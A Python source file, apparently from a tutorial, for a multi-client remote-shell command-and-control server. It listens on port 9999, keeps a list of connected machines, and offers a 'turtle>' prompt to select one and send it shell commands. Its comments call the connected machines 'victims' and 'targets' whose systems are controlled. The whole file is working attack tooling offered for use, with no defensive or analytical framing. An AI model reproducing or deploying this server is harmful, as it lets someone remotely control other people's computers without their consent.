import socket
import sys
import threading
import time
from queue import Queue
# we can just increase the number and add more threads if we want to in future
NUMBER_OF_THREADS = 2# Two threads which we have to do simultaneously
JOB_NUMBER = [1, 2]# Job of First thread to listen to connection and accept
#connection when any of the client wants to connect
# whereas the job of the second thread is to send commands
# to the client and handling connections with existing client
queue = Queue()
all_connections = [] # storage for connection objects
all_address = [] # storage for address list of client which contains Ip address and port number


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s # socket
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s # socket
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5) # to listen request of victim It can listen
                    # upto 5 requests from different computers

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# 1st Thread
# Handling Connections from multiple clients and saving to a list Start
# Closing previous connections when serverformultipleclients.py file is restarted.

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]# Emptying the list for running serverformultipleclients.py file again
        # so it would not contain the data of the previous time.
    del all_address[:]

    while True:
        try:
            conn, address = s.accept() # connects the first client
            s.setblocking(1)  # prevents timeout
            # for eg. if the client has connected to your server and you do nothing with the client,
            # then soon the connection would be disconnected due to timeout.
            # to avoid this we are using this function

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])# printing Ip address of client

        except:
            print("Error accepting connections")


# 2nd Thread
# 1) See all the clients 2) Select a client 3) Send commands to the connected client
# We will build an Custom Interactive prompt(Our own command prompt) for sending commands to multiple clients by switching between multiple clients

# our own command prompt
# turtle:> list
# 0 Friend-A
# 1 Friend-B
# 2 Friend-C
# 3 Friend-D

# turtle:> select 1 to select 2nd client in the list



def start_turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list': # show us all the clients with their respective select numbers
            list_connections()
        elif 'select' in cmd: # this will let us select a client to control their system
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")


# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections): # i fetches the index number
        try:
            conn.send(str.encode(' ')) # we are testing if our connection is alive by sending an empty string to get some response from the client
            conn.recv(20480) # we are making the chunk size big because we don't know if we get a very big response
        except:  # if we don't get any response for a particular client
            del all_connections[i] # his connection object
            del all_address[i]  # and his address both will be deleted from the list
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
        # we are storing data of the clients in a string and would display to see which connection is alive
    print("----Clients----" + "\n" + results)

    # printing'


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id of the client which is passed in the select statement
        target = int(target) # casting to int as we want to pass it as list index
        conn = all_connections[target]  # getting the connection object
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="") # Just to make sure that we are not in the turtle and are in the client's computer shell so we are displaying the ip of the client
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True # to close the thread after the work is done otherwise our process would be over but thread wouldn't after moving to next client or so.
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs(): # Just copying the job number from list to a queue
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()